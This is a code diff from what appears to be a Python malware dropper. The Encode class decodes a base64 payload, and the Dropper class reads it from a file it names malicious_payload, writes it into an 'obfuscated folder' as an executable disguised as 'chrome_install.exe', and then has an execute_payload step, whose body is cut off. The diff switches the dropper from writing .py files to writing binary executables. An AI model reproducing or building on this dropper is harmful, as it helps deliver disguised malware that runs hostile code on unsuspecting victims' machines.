@@ -35,12 +35,12 @@ class Encode:
         a method to decode base64
         """
         
-        base64_bytes = encoded_code.encode("ascii")
+        base64_bytes = encoded_code.encode("utf-8")
 
-        encoded_code_bytes = base64.b64decode(base64_bytes)
-        sample_string = encoded_code_bytes.decode("ascii")
+        encoded_code_bytes = base64.b64decode(encoded_code)
 
-        return sample_string
+        return encoded_code_bytes
+
 
 class Dropper:
 
@@ -94,16 +94,16 @@ class Dropper:
         #decode payload
         encodeclass = Encode()
         
-        with open("encoded_code.txt", "r") as malicious_payload:
+        with open("build\\encoded_code.txt", "r") as malicious_payload:
             encoded_payload = malicious_payload.read()
-            self.decoded_payload = encodeclass.decode(encoded_payload) 
+            self.decoded_payload = encodeclass.decode(encoded_payload)
 
     def write_payload(self):
         """
         a method that will write the payload in the obfuscated folder
         """
-        path = f"{self.folder_path}\\chrome_install.py"
-        with open(path, "w") as text_file:
+        path = f"{self.folder_path}\\chrome_install.exe"
+        with open(path, "wb") as text_file:
             text_file.write(self.decoded_payload)
 
     def execute_payload(self):
